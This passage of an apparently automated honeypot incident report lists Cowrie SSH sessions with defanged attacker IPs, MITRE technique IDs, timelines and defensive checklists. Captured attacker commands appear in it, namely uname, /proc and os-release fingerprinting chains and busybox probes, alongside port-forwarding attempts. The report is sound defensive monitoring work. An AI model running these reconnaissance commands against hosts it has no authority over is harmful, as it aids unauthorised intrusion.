| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 14:02:24` | `cowrie.session.connect` |
| `2026-08-05 14:02:24` | `cowrie.client.version` |
| `2026-08-05 14:02:24` | `cowrie.client.kex` |
| `2026-08-05 14:02:25` | `cowrie.login.success` |
| `2026-08-05 14:02:27` | `cowrie.session.params` |
| `2026-08-05 14:02:27` | `cowrie.command.input` |
| `2026-08-05 14:02:27` | `cowrie.log.closed` |
| `2026-08-05 14:02:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `178.128.80[.]167` to AbuseIPDB if not already reported
- [ ] Block `178.128.80[.]167` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-665749674c0b

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-05 14:03 |
| **Last Seen** | 2026-08-05 14:03 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 14:03:17` | `cowrie.session.connect` |
| `2026-08-05 14:03:17` | `cowrie.client.version` |
| `2026-08-05 14:03:17` | `cowrie.client.kex` |
| `2026-08-05 14:03:18` | `cowrie.login.success` |
| `2026-08-05 14:03:19` | `cowrie.session.params` |
| `2026-08-05 14:03:19` | `cowrie.command.input` |
| `2026-08-05 14:03:19` | `cowrie.command.input` |
| `2026-08-05 14:03:19` | `cowrie.command.input` |
| `2026-08-05 14:03:19` | `cowrie.command.input` |
| `2026-08-05 14:03:19` | `cowrie.command.input` |
| `2026-08-05 14:03:19` | `cowrie.command.success` |
| `2026-08-05 14:03:19` | `cowrie.command.input` |
| `2026-08-05 14:03:19` | `cowrie.command.input` |
| `2026-08-05 14:03:19` | `cowrie.command.input` |
| `2026-08-05 14:03:19` | `cowrie.command.input` |
| `2026-08-05 14:03:19` | `cowrie.log.closed` |
| `2026-08-05 14:03:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fa3feba50f86

| Field | Detail |
|---|---|
| **Source IP** | `102.220.160[.]47` |
| **First Seen** | 2026-08-05 14:03 |
| **Last Seen** | 2026-08-05 14:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 14:03:52` | `cowrie.session.connect` |
| `2026-08-05 14:03:52` | `cowrie.client.version` |
| `2026-08-05 14:03:53` | `cowrie.client.kex` |
| `2026-08-05 14:03:53` | `cowrie.login.success` |
| `2026-08-05 14:03:53` | `cowrie.direct-tcpip.request` |
| `2026-08-05 14:03:54` | `cowrie.direct-tcpip.data` |
| `2026-08-05 14:03:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.220.160[.]47` to AbuseIPDB if not already reported
- [ ] Block `102.220.160[.]47` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-41005256d14b

| Field | Detail |
|---|---|
| **Source IP** | `222.190.110[.]210` |
| **First Seen** | 2026-08-05 14:04 |
| **Last Seen** | 2026-08-05 14:04 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 14:04:10` | `cowrie.session.connect` |
| `2026-08-05 14:04:11` | `cowrie.client.version` |
| `2026-08-05 14:04:11` | `cowrie.client.kex` |
| `2026-08-05 14:04:14` | `cowrie.login.success` |
| `2026-08-05 14:04:14` | `cowrie.direct-tcpip.request` |
| `2026-08-05 14:04:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `222.190.110[.]210` to AbuseIPDB if not already reported
- [ ] Block `222.190.110[.]210` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b99864833705

| Field | Detail |
|---|---|
| **Source IP** | `178.178.222[.]50` |
| **First Seen** | 2026-08-05 14:04 |
| **Last Seen** | 2026-08-05 14:04 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 14:04:26` | `cowrie.session.connect` |
| `2026-08-05 14:04:27` | `cowrie.client.version` |
| `2026-08-05 14:04:27` | `cowrie.client.kex` |
| `2026-08-05 14:04:28` | `cowrie.login.success` |
| `2026-08-05 14:04:28` | `cowrie.direct-tcpip.request` |
| `2026-08-05 14:04:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `178.178.222[.]50` to AbuseIPDB if not already reported
- [ ] Block `178.178.222[.]50` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-212bc890a7b6

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-05 14:04 |
| **Last Seen** | 2026-08-05 14:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 14:04:50` | `cowrie.session.connect` |
| `2026-08-05 14:04:50` | `cowrie.client.version` |
| `2026-08-05 14:04:50` | `cowrie.client.kex` |
| `2026-08-05 14:04:50` | `cowrie.login.success` |
| `2026-08-05 14:04:51` | `cowrie.session.params` |
| `2026-08-05 14:04:51` | `cowrie.command.input` |
| `2026-08-05 14:04:51` | `cowrie.command.input` |
| `2026-08-05 14:04:51` | `cowrie.command.input` |
| `2026-08-05 14:04:51` | `cowrie.command.input` |
| `2026-08-05 14:04:51` | `cowrie.command.input` |
| `2026-08-05 14:04:51` | `cowrie.command.success` |
| `2026-08-05 14:04:51` | `cowrie.command.input` |
| `2026-08-05 14:04:51` | `cowrie.command.input` |
| `2026-08-05 14:04:51` | `cowrie.command.input` |
| `2026-08-05 14:04:51` | `cowrie.command.input` |
| `2026-08-05 14:04:51` | `cowrie.log.closed` |
| `2026-08-05 14:04:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ef19154788a7

| Field | Detail |
|---|---|
| **Source IP** | `178.128.80[.]167` |
| **First Seen** | 2026-08-05 14:05 |
| **Last Seen** | 2026-08-05 14:05 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 14:05:07` | `cowrie.session.connect` |
| `2026-08-05 14:05:07` | `cowrie.client.version` |
| `2026-08-05 14:05:08` | `cowrie.client.kex` |
| `2026-08-05 14:05:08` | `cowrie.login.success` |
| `2026-08-05 14:05:10` | `cowrie.session.params` |
| `2026-08-05 14:05:10` | `cowrie.command.input` |
| `2026-08-05 14:05:10` | `cowrie.log.closed` |
| `2026-08-05 14:05:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `178.128.80[.]167` to AbuseIPDB if not already reported
- [ ] Block `178.128.80[.]167` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-23553e5cef87

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-05 14:06 |
| **Last Seen** | 2026-08-05 14:06 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 14:06:21` | `cowrie.session.connect` |
| `2026-08-05 14:06:21` | `cowrie.client.version` |
| `2026-08-05 14:06:21` | `cowrie.client.kex` |
| `2026-08-05 14:06:22` | `cowrie.login.success` |
| `2026-08-05 14:06:24` | `cowrie.session.params` |
| `2026-08-05 14:06:24` | `cowrie.command.input` |
| `2026-08-05 14:06:24` | `cowrie.command.input` |
| `2026-08-05 14:06:24` | `cowrie.command.input` |
| `2026-08-05 14:06:24` | `cowrie.command.input` |
| `2026-08-05 14:06:24` | `cowrie.command.input` |
| `2026-08-05 14:06:24` | `cowrie.command.success` |
| `2026-08-05 14:06:24` | `cowrie.command.input` |
| `2026-08-05 14:06:24` | `cowrie.command.input` |
| `2026-08-05 14:06:24` | `cowrie.command.input` |
| `2026-08-05 14:06:24` | `cowrie.command.input` |
| `2026-08-05 14:06:24` | `cowrie.log.closed` |
| `2026-08-05 14:06:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1cf0ffb995e4

| Field | Detail |
|---|---|
| **Source IP** | `130.12.182[.]224` |
| **First Seen** | 2026-08-05 14:07 |
| **Last Seen** | 2026-08-05 14:07 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 14:07:14` | `cowrie.session.connect` |
| `2026-08-05 14:07:14` | `cowrie.login.success` |
| `2026-08-05 14:07:15` | `cowrie.session.params` |
| `2026-08-05 14:07:15` | `cowrie.command.input` |
| `2026-08-05 14:07:15` | `cowrie.log.closed` |
| `2026-08-05 14:07:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `130.12.182[.]224` to AbuseIPDB if not already reported
- [ ] Block `130.12.182[.]224` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-701c2cf5d807

| Field | Detail |
|---|---|
| **Source IP** | `178.128.80[.]167` |
| **First Seen** | 2026-08-05 14:07 |
| **Last Seen** | 2026-08-05 14:07 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 14:07:43` | `cowrie.session.connect` |
| `2026-08-05 14:07:43` | `cowrie.client.version` |
| `2026-08-05 14:07:43` | `cowrie.client.kex` |
| `2026-08-05 14:07:44` | `cowrie.login.success` |
| `2026-08-05 14:07:45` | `cowrie.session.params` |
| `2026-08-05 14:07:45` | `cowrie.command.input` |
| `2026-08-05 14:07:45` | `cowrie.log.closed` |
| `2026-08-05 14:07:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `178.128.80[.]167` to AbuseIPDB if not already reported
- [ ] Block `178.128.80[.]167` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a999612bdfb0

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-05 14:07 |
| **Last Seen** | 2026-08-05 14:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 14:07:53` | `cowrie.session.connect` |
| `2026-08-05 14:07:53` | `cowrie.client.version` |
| `2026-08-05 14:07:53` | `cowrie.client.kex` |
| `2026-08-05 14:07:54` | `cowrie.login.success` |
| `2026-08-05 14:07:54` | `cowrie.session.params` |
| `2026-08-05 14:07:54` | `cowrie.command.input` |
| `2026-08-05 14:07:54` | `cowrie.command.input` |
| `2026-08-05 14:07:54` | `cowrie.command.input` |
| `2026-08-05 14:07:54` | `cowrie.command.input` |
| `2026-08-05 14:07:54` | `cowrie.command.input` |
| `2026-08-05 14:07:54` | `cowrie.command.success` |
| `2026-08-05 14:07:54` | `cowrie.command.input` |
| `2026-08-05 14:07:54` | `cowrie.command.input` |
| `2026-08-05 14:07:54` | `cowrie.command.input` |
| `2026-08-05 14:07:54` | `cowrie.command.input` |
| `2026-08-05 14:07:55` | `cowrie.log.closed` |
| `2026-08-05 14:07:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2c6dfd7c0a65

| Field | Detail |
|---|---|
| **Source IP** | `130.12.182[.]107` |
| **First Seen** | 2026-08-05 14:09 |
| **Last Seen** | 2026-08-05 14:09 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 14:09:18` | `cowrie.session.connect` |
| `2026-08-05 14:09:18` | `cowrie.client.version` |
| `2026-08-05 14:09:18` | `cowrie.client.kex` |
| `2026-08-05 14:09:19` | `cowrie.login.success` |
| `2026-08-05 14:09:19` | `cowrie.direct-tcpip.request` |
| `2026-08-05 14:09:19` | `cowrie.direct-tcpip.data` |
| `2026-08-05 14:09:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `130.12.182[.]107` to AbuseIPDB if not already reported
- [ ] Block `130.12.182[.]107` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ad324bf61d85

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-05 14:09 |
| **Last Seen** | 2026-08-05 14:09 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 14:09:29` | `cowrie.session.connect` |
| `2026-08-05 14:09:29` | `cowrie.client.version` |
| `2026-08-05 14:09:29` | `cowrie.client.kex` |
| `2026-08-05 14:09:29` | `cowrie.login.success` |
| `2026-08-05 14:09:30` | `cowrie.session.params` |
| `2026-08-05 14:09:30` | `cowrie.command.input` |
| `2026-08-05 14:09:30` | `cowrie.command.input` |
| `2026-08-05 14:09:30` | `cowrie.command.input` |
| `2026-08-05 14:09:30` | `cowrie.command.input` |
| `2026-08-05 14:09:30` | `cowrie.command.input` |
| `2026-08-05 14:09:30` | `cowrie.command.success` |
| `2026-08-05 14:09:30` | `cowrie.command.input` |
| `2026-08-05 14:09:30` | `cowrie.command.input` |
| `2026-08-05 14:09:30` | `cowrie.command.input` |
| `2026-08-05 14:09:30` | `cowrie.command.input` |
| `2026-08-05 14:09:31` | `cowrie.log.closed` |
| `2026-08-05 14:09:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f790cdc4f637

| Field | Detail |
|---|---|
| **Source IP** | `64.89.161[.]91` |
| **First Seen** | 2026-08-05 14:10 |
| **Last Seen** | 2026-08-05 14:10 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 14:10:09` | `cowrie.session.connect` |
| `2026-08-05 14:10:09` | `cowrie.client.version` |
| `2026-08-05 14:10:09` | `cowrie.client.kex` |
| `2026-08-05 14:10:10` | `cowrie.login.success` |
| `2026-08-05 14:10:10` | `cowrie.direct-tcpip.request` |
| `2026-08-05 14:10:10` | `cowrie.direct-tcpip.data` |
| `2026-08-05 14:10:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.89.161[.]91` to AbuseIPDB if not already reported
- [ ] Block `64.89.161[.]91` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fc3a91f8d307

| Field | Detail |
|---|---|
| **Source IP** | `94.154.43[.]210` |
| **First Seen** | 2026-08-05 14:10 |
| **Last Seen** | 2026-08-05 14:10 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo SHELL_TEST, uname -m, cat /proc/cpuinfo, /bin/busybox TEST, cat /proc` |
| **TTPs (MITRE)** | T1078 · T1083 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 14:10:30` | `cowrie.session.connect` |
| `2026-08-05 14:10:30` | `cowrie.login.success` |
| `2026-08-05 14:10:31` | `cowrie.session.params` |
| `2026-08-05 14:10:31` | `cowrie.command.input` |
| `2026-08-05 14:10:32` | `cowrie.command.input` |
| `2026-08-05 14:10:33` | `cowrie.command.input` |
| `2026-08-05 14:10:33` | `cowrie.command.input` |
| `2026-08-05 14:10:34` | `cowrie.command.input` |
| `2026-08-05 14:10:35` | `cowrie.command.input` |
| `2026-08-05 14:10:35` | `cowrie.command.failed` |
| `2026-08-05 14:10:36` | `cowrie.log.closed` |
| `2026-08-05 14:10:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.154.43[.]210` to AbuseIPDB if not already reported
- [ ] Block `94.154.43[.]210` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-192cebaa9ff2

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-05 14:11 |
| **Last Seen** | 2026-08-05 14:11 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 14:11:01` | `cowrie.session.connect` |
| `2026-08-05 14:11:01` | `cowrie.client.version` |
| `2026-08-05 14:11:01` | `cowrie.client.kex` |
| `2026-08-05 14:11:02` | `cowrie.login.success` |
| `2026-08-05 14:11:02` | `cowrie.session.params` |
| `2026-08-05 14:11:02` | `cowrie.command.input` |
| `2026-08-05 14:11:02` | `cowrie.command.input` |
| `2026-08-05 14:11:02` | `cowrie.command.input` |
| `2026-08-05 14:11:02` | `cowrie.command.input` |
| `2026-08-05 14:11:02` | `cowrie.command.input` |
| `2026-08-05 14:11:02` | `cowrie.command.success` |
| `2026-08-05 14:11:02` | `cowrie.command.input` |
| `2026-08-05 14:11:02` | `cowrie.command.input` |
| `2026-08-05 14:11:02` | `cowrie.command.input` |
| `2026-08-05 14:11:02` | `cowrie.command.input` |
| `2026-08-05 14:11:03` | `cowrie.log.closed` |
| `2026-08-05 14:11:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fde736e2c005

| Field | Detail |
|---|---|
| **Source IP** | `64.89.161[.]91` |
| **First Seen** | 2026-08-05 14:11 |
| **Last Seen** | 2026-08-05 14:11 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 14:11:03` | `cowrie.session.connect` |
| `2026-08-05 14:11:03` | `cowrie.client.version` |
| `2026-08-05 14:11:03` | `cowrie.client.kex` |
| `2026-08-05 14:11:04` | `cowrie.login.success` |
| `2026-08-05 14:11:04` | `cowrie.direct-tcpip.request` |
| `2026-08-05 14:11:04` | `cowrie.direct-tcpip.data` |
| `2026-08-05 14:11:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.89.161[.]91` to AbuseIPDB if not already reported
- [ ] Block `64.89.161[.]91` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e732b6ce9eee

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-05 14:12 |
| **Last Seen** | 2026-08-05 14:12 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 14:12:37` | `cowrie.session.connect` |
| `2026-08-05 14:12:37` | `cowrie.client.version` |
| `2026-08-05 14:12:37` | `cowrie.client.kex` |
| `2026-08-05 14:12:38` | `cowrie.login.success` |
| `2026-08-05 14:12:38` | `cowrie.session.params` |
| `2026-08-05 14:12:38` | `cowrie.command.input` |
| `2026-08-05 14:12:38` | `cowrie.command.input` |
| `2026-08-05 14:12:38` | `cowrie.command.input` |
| `2026-08-05 14:12:38` | `cowrie.command.input` |
| `2026-08-05 14:12:38` | `cowrie.command.input` |
| `2026-08-05 14:12:38` | `cowrie.command.success` |
| `2026-08-05 14:12:38` | `cowrie.command.input` |
| `2026-08-05 14:12:38` | `cowrie.command.input` |
| `2026-08-05 14:12:38` | `cowrie.command.input` |
